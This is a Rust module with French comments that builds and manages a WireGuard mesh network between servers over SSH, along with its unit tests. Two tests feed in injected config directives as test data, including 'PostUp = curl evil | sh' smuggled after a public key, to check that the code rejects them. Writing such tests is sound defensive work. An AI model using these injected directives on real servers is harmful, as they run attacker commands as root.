//! Réseau privé entre serveurs (WireGuard, maillage complet). Le PC orchestre par SSH : chaque
//! serveur génère sa clé (la clé privée ne le quitte jamais), Zenytt pousse la liste des pairs.
//! Zenytt ne touche qu'à ce qui lui appartient : interface `zenytt`, `/etc/wireguard/zenytt.*`.

use std::collections::HashSet;

use serde::Serialize;

use crate::firewall::section;
use crate::ssh::shell_quote;
use crate::{Connection, Error, Result};

pub const IFACE: &str = "zenytt";
pub const CONF: &str = "/etc/wireguard/zenytt.conf";
pub const KEY: &str = "/etc/wireguard/zenytt.key";
/// Configuration envoyée par Zenytt, avec le marqueur de clé : transformée en `CONF` sur le serveur.
const CONF_IN: &str = "/etc/wireguard/zenytt.conf.in";
pub const DEFAULT_PORT: u16 = 51820;
pub const LAST_PORT: u16 = 51899;
const HEADER: &str = "# zenytt-network:";
/// Remplacé sur le serveur par sa clé privée (voir `APPLY_SCRIPT`).
const KEY_MARKER: &str = "@ZENYTT_KEY@";

/// Membre d'un réseau, vu du PC.
#[derive(Debug, Clone, PartialEq)]
pub struct Member {
    /// Adresse privée, sans masque (`10.77.0.2`).
    pub address: String,
    pub public_key: String,
    /// IP ou nom public ; `None` : derrière un NAT, injoignable de l'extérieur.
    pub endpoint: Option<String>,
    pub port: u16,
}

#[derive(Debug, Clone, PartialEq)]
pub struct Peer {
    pub public_key: String,
    pub allowed_ip: String,
    pub endpoint: Option<String>,
    pub keepalive: bool,
}

/// Configuration d'un membre.
#[derive(Debug, Clone, PartialEq)]
pub struct NodeConfig {
    pub network_id: String,
    pub name: String,
    pub address: String,
    pub prefix: u8,
    pub port: u16,
    pub peers: Vec<Peer>,
}

/// Maillage complet, sauf entre deux membres derrière NAT (aucun ne peut joindre l'autre).
pub fn node_config(network_id: &str, name: &str, cidr: &str, members: &[Member], me: usize) -> NodeConfig {
    let mine = &members[me];
    let peers = members
        .iter()
        .enumerate()
        .filter(|(i, m)| *i != me && (m.endpoint.is_some() || mine.endpoint.is_some()))
        .map(|(_, m)| Peer {
            public_key: m.public_key.clone(),
            allowed_ip: format!("{}/32", m.address),
            // Une IPv6 littérale se met entre crochets, sinon son dernier « : » passerait pour le port.
            endpoint: m.endpoint.as_ref().map(|e| if e.contains(':') { format!("[{e}]:{}", m.port) } else { format!("{e}:{}", m.port) }),
            // Derrière NAT, c'est à moi d'ouvrir et d'entretenir le passage.
            keepalive: mine.endpoint.is_none() && m.endpoint.is_some(),
        })
        .collect();
    NodeConfig {
        network_id: network_id.into(),
        name: name.into(),
        address: mine.address.clone(),
        prefix: cidr.split('/').nth(1).and_then(|p| p.parse().ok()).unwrap_or(24),
        port: mine.port,
        peers,
    }
}

/// Paires de membres qui ne peuvent pas se joindre directement (tous deux derrière NAT).
pub fn unreachable_pairs(members: &[Member]) -> Vec<(usize, usize)> {
    let mut out = Vec::new();
    for i in 0..members.len() {
        for j in i + 1..members.len() {
            if members[i].endpoint.is_none() && members[j].endpoint.is_none() {
                out.push((i, j));
            }
        }
    }
    out
}

/// Un champ de la configuration tient en un seul mot : aucun saut de ligne ne peut y glisser une
/// directive (`PostUp = …` s'exécuterait en root sur le serveur).
fn token(s: &str) -> String {
    s.chars().filter(|c| !c.is_control() && !c.is_whitespace()).collect()
}

pub fn render_config(c: &NodeConfig) -> String {
    let name: String = c.name.chars().map(|ch| if ch.is_control() { ' ' } else { ch }).collect();
    let mut s = format!(
        "{HEADER} {} {name}\n# Géré par Zenytt (section Réseau privé) : les modifications manuelles seront écrasées.\n[Interface]\nPrivateKey = {KEY_MARKER}\nAddress = {}/{}\nListenPort = {}\n",
        c.network_id, c.address, c.prefix, c.port
    );
    for p in &c.peers {
        s.push_str(&format!("\n[Peer]\nPublicKey = {}\nAllowedIPs = {}\n", token(&p.public_key), token(&p.allowed_ip)));
        if let Some(e) = &p.endpoint {
            s.push_str(&format!("Endpoint = {}\n", token(e)));
        }
        if p.keepalive {
            s.push_str("PersistentKeepalive = 25\n");
        }
    }
    s
}

/// `(id, nom)` du réseau Zenytt décrit par une configuration.
pub fn parse_header(conf: &str) -> Option<(String, String)> {
    let rest = conf.lines().next()?.strip_prefix(HEADER)?.trim();
    let (id, name) = rest.split_once(' ').unwrap_or((rest, ""));
    (!id.is_empty()).then(|| (id.to_string(), name.to_string()))
}

/// `a.b.c.d/n` ou `a.b.c.d` (= /32).
fn net(s: &str) -> Option<(u32, u8)> {
    let (ip, prefix) = s.split_once('/').unwrap_or((s, "32"));
    let prefix: u8 = prefix.parse().ok().filter(|p| *p <= 32)?;
    Some((u32::from(ip.parse::<std::net::Ipv4Addr>().ok()?), prefix))
}

fn mask(prefix: u8) -> u32 {
    if prefix == 0 {
        0
    } else {
        u32::MAX << (32 - prefix)
    }
}

/// Le réseau `cidr` recouvre-t-il une destination de la table de routage (`ip -4 -o route`) ?
/// Les routes de notre propre interface sont ignorées.
pub fn overlaps(cidr: &str, routes: &str) -> bool {
    let Some((base, prefix)) = net(cidr) else { return true };
    routes
        .lines()
        .filter(|l| !l.split_whitespace().collect::<Vec<_>>().windows(2).any(|w| w == ["dev", IFACE]))
        .filter_map(|l| l.split_whitespace().next())
        .filter_map(net)
        .any(|(b, p)| {
            let m = mask(prefix.min(p));
            base & m == b & m
        })
}

/// Premier `/24` libre de `10.77.0.0/24` à `10.99.0.0/24`.
pub fn pick_subnet(routes: &str) -> Option<String> {
    (77..=99).map(|n| format!("10.{n}.0.0/24")).find(|c| !overlaps(c, routes))
}

pub fn next_address(cidr: &str, used: &[String]) -> Option<String> {
    let (base, _) = net(cidr)?;
    (1..=254u32).map(|i| std::net::Ipv4Addr::from((base & mask(24)) | i).to_string()).find(|a| !used.contains(a))
}

pub fn free_port(busy: &HashSet<u16>) -> Option<u16> {
    (DEFAULT_PORT..=LAST_PORT).find(|p| !busy.contains(p))
}

pub fn is_public_ipv4(ip: &str) -> bool {
    ip.parse::<std::net::Ipv4Addr>().is_ok_and(|a| {
        let [x, y, ..] = a.octets();
        // 100.64.0.0/10 : NAT d'opérateur (et adresses Tailscale), jamais joignable de l'extérieur.
        !(a.is_private() || a.is_loopback() || a.is_link_local() || a.is_unspecified() || (x == 100 && (64..128).contains(&y)))
    })
}

/// IPv4 publiques d'une sortie `ip -4 -o addr show scope global`.
pub fn public_ipv4(addr_output: &str) -> Vec<String> {
    addr_output
        .lines()
        .filter_map(|l| {
            let mut w = l.split_whitespace();
            w.find(|t| *t == "inet")?;
            w.next()?.split('/').next().map(str::to_string)
        })
        .filter(|ip| is_public_ipv4(ip))
        .collect()
}

#[derive(Debug, Clone, Serialize, PartialEq)]
#[serde(rename_all = "camelCase")]
pub struct Link {
    pub public_key: String,
    pub endpoint: Option<String>,
    /// Horodatage Unix du dernier échange ; `None` : jamais.
    pub last_handshake: Option<u64>,
    pub rx: u64,
    pub tx: u64,
}

/// Lignes de pairs de `wg show zenytt dump` (sans la première ligne, qui contient la clé privée).
pub fn parse_peers(dump: &str) -> Vec<Link> {
    dump.lines()
        .filter_map(|l| {
            let f: Vec<&str> = l.split('\t').collect();
            (f.len() >= 8).then(|| Link {
                public_key: f[0].to_string(),
                endpoint: (f[2] != "(none)").then(|| f[2].to_string()),
                last_handshake: f[4].parse().ok().filter(|t| *t > 0),
                rx: f[5].parse().unwrap_or(0),
                tx: f[6].parse().unwrap_or(0),
            })
        })
        .collect()
}

/// Installe wireguard-tools si besoin, fait générer la clé par le serveur (une seule fois), puis
/// décrit le serveur. La clé privée n'est jamais affichée : seule la clé publique sort.
const PREPARE_SCRIPT: &str = r#"set -e
if ! command -v wg >/dev/null || ! command -v wg-quick >/dev/null; then
  if command -v apt-get >/dev/null; then
    DEBIAN_FRONTEND=noninteractive apt-get install -y wireguard-tools >&2 || { apt-get update >&2 && DEBIAN_FRONTEND=noninteractive apt-get install -y wireguard-tools >&2; }
  elif command -v dnf >/dev/null; then dnf install -y wireguard-tools >&2
  elif command -v apk >/dev/null; then apk add wireguard-tools >&2
  elif command -v pacman >/dev/null; then pacman -S --noconfirm wireguard-tools >&2
  else echo "installe wireguard-tools sur ce serveur (gestionnaire de paquets inconnu)" >&2; exit 1; fi
fi
mkdir -p /etc/wireguard && chmod 700 /etc/wireguard
[ -s /etc/wireguard/zenytt.key ] || (umask 077 && wg genkey > /etc/wireguard/zenytt.key)
echo @@key; wg pubkey < /etc/wireguard/zenytt.key
echo @@addr; ip -4 -o addr show scope global || true
echo @@route; ip -4 -o route || true
echo @@udp; ss -Hlun 2>/dev/null | awk '{print $4}' || true
echo @@conf; head -n1 /etc/wireguard/zenytt.conf 2>/dev/null || true
echo @@port; sed -n 's/^ListenPort *= *//p' /etc/wireguard/zenytt.conf 2>/dev/null || true
"#;

/// Construit la configuration à partir de celle envoyée (`zenytt.conf.in`) en y plaçant la clé,
/// ouvre le port UDP dans le pare-feu local, puis lève l'interface ou la met à jour sans couper les
/// liens. `$1` : port UDP.
///
/// - La clé est lue par awk depuis son fichier : elle n'apparaît dans aucune ligne de commande.
/// - firewalld n'est jamais rechargé : un rechargement effacerait les règles ouvertes à chaud (un
///   port SSH, par exemple) et couperait l'accès au serveur.
/// - Adresse changée ou interface absente (même si l'unité systemd se croit active) : redémarrage
///   complet ; sinon `wg syncconf`, qui ne coupe rien.
const APPLY_SCRIPT: &str = r#"set -e
W=/etc/wireguard
trap 'rm -f "$W/zenytt.conf.new" "$W/zenytt.strip"' EXIT
umask 077
awk 'BEGIN { getline k < "/etc/wireguard/zenytt.key" } { sub(/@ZENYTT_KEY@/, k) } 1' "$W/zenytt.conf.in" > "$W/zenytt.conf.new"
mv -f "$W/zenytt.conf.new" "$W/zenytt.conf"
rm -f "$W/zenytt.conf.in"
if command -v ufw >/dev/null && ufw status 2>/dev/null | grep -q '^Status: active'; then ufw allow "$1/udp" comment zenytt >&2; fi
if command -v firewall-cmd >/dev/null && firewall-cmd --state >/dev/null 2>&1; then
  firewall-cmd --add-port="$1/udp" >&2
  firewall-cmd --permanent --add-port="$1/udp" >&2
fi
WANT=$(sed -n 's/^Address *= *//p' "$W/zenytt.conf")
HAVE=$(ip -4 -o addr show dev zenytt 2>/dev/null | awk '{print $4}' | head -n1)
if [ -n "$HAVE" ] && [ "$HAVE" = "$WANT" ]; then
  wg-quick strip zenytt > "$W/zenytt.strip"
  wg syncconf zenytt "$W/zenytt.strip"
elif [ -d /run/systemd/system ]; then
  systemctl enable wg-quick@zenytt >/dev/null 2>&1 || true
  systemctl stop wg-quick@zenytt >/dev/null 2>&1 || true
  if ip link show zenytt >/dev/null 2>&1; then ip link delete zenytt; fi
  systemctl restart wg-quick@zenytt >&2
else
  if ip link show zenytt >/dev/null 2>&1; then wg-quick down zenytt >&2 || ip link delete zenytt; fi
  wg-quick up zenytt >&2
  # OpenRC (Alpine…) : relancé au démarrage par le script wg-quick fourni avec wireguard-tools.
  if command -v rc-update >/dev/null && [ -e /etc/init.d/wg-quick ]; then
    ln -sf wg-quick /etc/init.d/wg-quick.zenytt
    rc-update add wg-quick.zenytt default >&2 || true
  fi
fi
"#;

const STATUS_SCRIPT: &str = r#"echo @@conf; head -n1 /etc/wireguard/zenytt.conf 2>/dev/null || true
echo @@up; if ip link show zenytt >/dev/null 2>&1; then echo yes; else echo no; fi
echo @@peers; wg show zenytt dump 2>/dev/null | tail -n +2 || true
"#;

/// `$1` : port UDP à refermer ; vide : celui de la configuration présente sur le serveur.
const REMOVE_SCRIPT: &str = r#"P=${1:-$(sed -n 's/^ListenPort *= *//p' /etc/wireguard/zenytt.conf 2>/dev/null)}
if [ -d /run/systemd/system ]; then systemctl disable --now wg-quick@zenytt >/dev/null 2>&1 || true; fi
if [ -e /etc/init.d/wg-quick.zenytt ]; then rc-update del wg-quick.zenytt default >/dev/null 2>&1 || true; rm -f /etc/init.d/wg-quick.zenytt; fi
if ip link show zenytt >/dev/null 2>&1; then wg-quick down zenytt >&2 || ip link delete zenytt; fi
rm -f /etc/wireguard/zenytt.conf /etc/wireguard/zenytt.conf.in /etc/wireguard/zenytt.key
if [ -n "$P" ]; then
  if command -v ufw >/dev/null; then ufw delete allow "$P/udp" >/dev/null 2>&1 || true; fi
  if command -v firewall-cmd >/dev/null && firewall-cmd --state >/dev/null 2>&1; then
    firewall-cmd --remove-port="$P/udp" >/dev/null 2>&1 || true
    firewall-cmd --permanent --remove-port="$P/udp" >/dev/null 2>&1 || true
  fi
fi
! ip link show zenytt >/dev/null 2>&1
"#;

/// Ce que le PC doit savoir d'un serveur avant de l'ajouter à un réseau.
#[derive(Debug, Clone, PartialEq)]
pub struct Prepared {
    pub public_key: String,
    pub public_ips: Vec<String>,
    pub routes: String,
    pub busy_udp: HashSet<u16>,
    /// Réseau Zenytt dont ce serveur est déjà membre.
    pub existing: Option<(String, String)>,
    pub existing_port: Option<u16>,
}

/// Clé publique WireGuard : 32 octets en base64, soit 43 caractères suivis de « = ».
pub fn valid_public_key(k: &str) -> bool {
    const B64: &str = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    let b = k.as_bytes();
    b.len() == 44
        && b[43] == b'='
        && b[..43].iter().all(|c| B64.as_bytes().contains(c))
        // Le dernier caractère ne porte que 4 bits utiles : les 2 autres sont nuls.
        && "AEIMQUYcgkosw048".as_bytes().contains(&b[42])
}

pub fn parse_prepared(out: &str) -> Result<Prepared> {
    let public_key = section(out, "key").trim().to_string();
    if public_key.is_empty() {
        return Err(Error::Other("clé WireGuard non générée sur le serveur".into()));
    }
    // Elle sera recopiée chez tous les autres membres : rien d'autre qu'une clé ne doit passer.
    if !valid_public_key(&public_key) {
        return Err(Error::Other("clé publique WireGuard invalide renvoyée par le serveur".into()));
    }
    Ok(Prepared {
        public_key,
        public_ips: public_ipv4(section(out, "addr")),
        routes: section(out, "route").to_string(),
        busy_udp: section(out, "udp").lines().filter_map(|l| l.trim().rsplit(':').next()?.parse().ok()).collect(),
        existing: parse_header(section(out, "conf")),
        existing_port: section(out, "port").trim().parse().ok(),
    })
}

pub async fn prepare(conn: &Connection, sudo: Option<&str>) -> Result<Prepared> {
    let cmd = format!("sh -c {}", shell_quote(PREPARE_SCRIPT));
    let out = crate::ssh::long(conn.exec_sudo(&cmd, sudo, None)).await?.into_result()?;
    parse_prepared(&out.stdout)
}

pub async fn apply(conn: &Connection, sudo: Option<&str>, c: &NodeConfig) -> Result<()> {
    conn.write_file_sudo(CONF_IN, &render_config(c), sudo).await?;
    let cmd = format!("sh -c {} zenytt-mesh {}", shell_quote(APPLY_SCRIPT), c.port);
    crate::ssh::long(conn.exec_sudo(&cmd, sudo, None)).await?.into_result()?;
    Ok(())
}

/// État de l'interface d'un membre, lu sur le serveur.
#[derive(Debug, Clone, Serialize, PartialEq)]
#[serde(rename_all = "camelCase")]
pub struct NodeStatus {
    pub network_id: Option<String>,
    pub up: bool,
    pub links: Vec<Link>,
}

pub async fn status(conn: &Connection, sudo: Option<&str>) -> Result<NodeStatus> {
    let cmd = format!("sh -c {}", shell_quote(STATUS_SCRIPT));
    let out = conn.exec_sudo(&cmd, sudo, None).await?.into_result()?.stdout;
    Ok(NodeStatus {
        network_id: parse_header(section(&out, "conf")).map(|(id, _)| id),
        up: section(&out, "up").trim() == "yes",
        links: parse_peers(section(&out, "peers")),
    })
}

/// Retire le serveur de son réseau. `port` : `None` pour celui de la configuration du serveur
/// (reprise d'un serveur resté dans un réseau que ce PC ne connaît pas).
pub async fn remove(conn: &Connection, sudo: Option<&str>, port: Option<u16>) -> Result<()> {
    let port = port.map(|p| p.to_string()).unwrap_or_default();
    let cmd = format!("sh -c {} zenytt-mesh {}", shell_quote(REMOVE_SCRIPT), shell_quote(&port));
    crate::ssh::long(conn.exec_sudo(&cmd, sudo, None)).await?.into_result()?;
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;

    fn m(address: &str, key: &str, endpoint: Option<&str>) -> Member {
        Member { address: address.into(), public_key: key.into(), endpoint: endpoint.map(Into::into), port: 51820 }
    }

    #[test]
    fn full_mesh_between_public_members() {
        let members =
            [m("10.77.0.1", "KA", Some("51.0.0.1")), m("10.77.0.2", "KB", Some("95.0.0.2")), m("10.77.0.3", "KC", Some("5.0.0.3"))];
        let c = node_config("net1", "Prod", "10.77.0.0/24", &members, 0);
        assert_eq!(c.address, "10.77.0.1");
        assert_eq!(c.prefix, 24);
        assert_eq!(c.peers.len(), 2);
        assert_eq!(
            c.peers[0],
            Peer { public_key: "KB".into(), allowed_ip: "10.77.0.2/32".into(), endpoint: Some("95.0.0.2:51820".into()), keepalive: false }
        );
    }

    #[test]
    fn nat_member_gets_keepalive() {
        let members = [m("10.77.0.1", "KA", Some("51.0.0.1")), m("10.77.0.2", "KB", None)];
        let nat = node_config("n", "N", "10.77.0.0/24", &members, 1);
        assert!(nat.peers[0].keepalive, "le membre derrière NAT entretient le lien");
        let public = node_config("n", "N", "10.77.0.0/24", &members, 0);
        assert_eq!(public.peers[0].endpoint, None, "pas d'adresse connue pour un membre derrière NAT");
        assert!(!public.peers[0].keepalive);
    }

    #[test]
    fn two_nat_members_are_unreachable() {
        let members = [m("10.77.0.1", "KA", Some("51.0.0.1")), m("10.77.0.2", "KB", None), m("10.77.0.3", "KC", None)];
        assert_eq!(unreachable_pairs(&members), vec![(1, 2)]);
        let c = node_config("n", "N", "10.77.0.0/24", &members, 1);
        assert_eq!(c.peers.len(), 1, "KC n'est pas listé : aucun des deux ne peut joindre l'autre");
    }

    #[test]
    fn render_keeps_private_key_on_server() {
        let members = [m("10.77.0.1", "KA", Some("51.0.0.1")), m("10.77.0.2", "KB", None)];
        let text = render_config(&node_config("abc", "Prod\nX", "10.77.0.0/24", &members, 1));
        assert!(text.starts_with("# zenytt-network: abc Prod X\n"), "{text}");
        assert!(text.contains("PrivateKey = @ZENYTT_KEY@\n"));
        assert!(text.contains("Address = 10.77.0.2/24\n"));
        assert!(text.contains("ListenPort = 51820\n"));
        assert!(text.contains("PersistentKeepalive = 25\n"));
        assert!(!text.contains("0.0.0.0/0"), "jamais de sortie Internet par le réseau privé");
        assert_eq!(parse_header(&text), Some(("abc".into(), "Prod X".into())));
    }

    #[test]
    fn pick_subnet_skips_used_routes() {
        let routes =
            "default via 172.31.1.1 dev eth0\n10.77.0.0/16 dev br-1234 proto kernel scope link src 10.77.0.1\n172.17.0.0/16 dev docker0\n";
        assert_eq!(pick_subnet(routes), Some("10.78.0.0/24".into()));
        assert_eq!(pick_subnet(""), Some("10.77.0.0/24".into()));
        assert!(overlaps("10.77.0.0/24", routes));
        assert!(!overlaps("10.78.0.0/24", routes));
    }

    #[test]
    fn pick_subnet_none_when_all_used() {
        assert_eq!(pick_subnet("10.0.0.0/8 dev eth1\n"), None);
    }

    #[test]
    fn routes_of_our_interface_are_ignored() {
        assert!(!overlaps("10.77.0.0/24", "10.77.0.0/24 dev zenytt proto kernel scope link src 10.77.0.1\n"));
    }

    #[test]
    fn addresses_and_ports() {
        assert_eq!(next_address("10.77.0.0/24", &[]), Some("10.77.0.1".into()));
        assert_eq!(next_address("10.77.0.0/24", &["10.77.0.1".into(), "10.77.0.3".into()]), Some("10.77.0.2".into()));
        let busy: HashSet<u16> = [51820, 51821].into();
        assert_eq!(free_port(&busy), Some(51822));
        let all: HashSet<u16> = (DEFAULT_PORT..=LAST_PORT).collect();
        assert_eq!(free_port(&all), None);
    }

    #[test]
    fn public_addresses() {
        let out = "2: eth0    inet 51.89.1.2/32 brd 51.89.1.2 scope global eth0\\       valid_lft forever\n\
                   3: eth1    inet 10.0.0.5/24 brd 10.0.0.255 scope global eth1\n\
                   4: docker0    inet 172.17.0.1/16 scope global docker0\n\
                   5: tailscale0    inet 100.101.2.3/32 scope global tailscale0\n";
        assert_eq!(public_ipv4(out), vec!["51.89.1.2".to_string()]);
        assert!(is_public_ipv4("8.8.8.8"));
        assert!(!is_public_ipv4("192.168.1.10"));
        assert!(!is_public_ipv4("vps.example.com"));
    }

    #[test]
    fn parse_wg_dump_peers() {
        // `wg show zenytt dump | tail -n +2` : clé publique, clé partagée, adresse, IP autorisées, dernier échange, reçu, envoyé, keepalive.
        let dump =
            "KB=\t(none)\t95.0.0.2:51820\t10.77.0.2/32\t1790000000\t1200\t3400\toff\nKC=\t(none)\t(none)\t10.77.0.3/32\t0\t0\t0\t25\n";
        let links = parse_peers(dump);
        assert_eq!(
            links[0],
            Link {
                public_key: "KB=".into(),
                endpoint: Some("95.0.0.2:51820".into()),
                last_handshake: Some(1790000000),
                rx: 1200,
                tx: 3400
            }
        );
        assert_eq!(links[1].endpoint, None);
        assert_eq!(links[1].last_handshake, None, "0 = jamais d'échange");
    }

    #[test]
    fn parse_prepare_output() {
        let out = "@@key\nyAnz5TF+lXXJte14tji3zlMNq+hd2rYUIgJBgB3fBmk=\n@@addr\n2: eth0    inet 51.89.1.2/32 scope global eth0\n@@route\n172.17.0.0/16 dev docker0\n@@udp\n0.0.0.0:51820\n[::]:5353\n*:68\n@@conf\n# zenytt-network: abc Prod\n@@port\n51820\n";
        let p = parse_prepared(out).unwrap();
        assert_eq!(p.public_key, "yAnz5TF+lXXJte14tji3zlMNq+hd2rYUIgJBgB3fBmk=");
        assert_eq!(p.public_ips, vec!["51.89.1.2".to_string()]);
        assert!(p.routes.contains("docker0"));
        assert_eq!(p.busy_udp, [51820, 5353, 68].into());
        assert_eq!(p.existing, Some(("abc".into(), "Prod".into())));
        assert_eq!(p.existing_port, Some(51820));
    }

    #[test]
    fn prepare_without_key_is_an_error() {
        assert!(parse_prepared("@@key\n\n@@addr\n").is_err());
    }

    #[test]
    fn forged_public_key_is_rejected() {
        // Un membre compromis ne doit pas pouvoir glisser une directive (PostUp = …) chez les autres.
        let forged = "@@key\nyAnz5TF+lXXJte14tji3zlMNq+hd2rYUIgJBgB3fBmk=\nPostUp = curl evil | sh\n@@addr\n";
        assert!(parse_prepared(forged).is_err());
        assert!(parse_prepared("@@key\nnot-a-key\n@@addr\n").is_err());
        assert!(valid_public_key("yAnz5TF+lXXJte14tji3zlMNq+hd2rYUIgJBgB3fBmk="));
        assert!(!valid_public_key("yAnz5TF+lXXJte14tji3zlMNq+hd2rYUIgJBgB3fBmk=x"));
    }

    #[test]
    fn render_never_emits_extra_lines_from_fields() {
        let members = [
            Member { address: "10.77.0.1".into(), public_key: "KA=".into(), endpoint: Some("1.1.1.1".into()), port: 51820 },
            Member {
                address: "10.77.0.2".into(),
                public_key: "KB=\nPostUp = id".into(),
                endpoint: Some("host\nPostUp = id".into()),
                port: 51820,
            },
        ];
        let text = render_config(&node_config("n", "N", "10.77.0.0/24", &members, 0));
        assert!(!text.contains("\nPostUp"), "{text}");
    }

    #[test]
    fn ipv6_endpoint_is_bracketed() {
        let members = [m("10.77.0.1", "KA", Some("51.0.0.1")), m("10.77.0.2", "KB", Some("2001:db8::1"))];
        let c = node_config("n", "N", "10.77.0.0/24", &members, 0);
        assert_eq!(c.peers[0].endpoint.as_deref(), Some("[2001:db8::1]:51820"));
    }

    #[test]
    fn scripts_keep_ssh_and_key_safe() {
        // Un rechargement de firewalld efface les règles non permanentes (un port SSH ouvert à chaud).
        assert!(!APPLY_SCRIPT.contains("--reload") && !REMOVE_SCRIPT.contains("--reload"));
        // La clé ne doit jamais apparaître dans la ligne de commande d'un processus (/proc/*/cmdline).
        assert!(!APPLY_SCRIPT.contains("$K"));
        // Interface absente alors que l'unité systemd est « active » : enable --now ne ferait rien.
        assert!(APPLY_SCRIPT.contains("systemctl restart wg-quick@zenytt"));
        // Sans systemd, OpenRC relance le réseau au démarrage.
        assert!(APPLY_SCRIPT.contains("rc-update add"));
    }
}
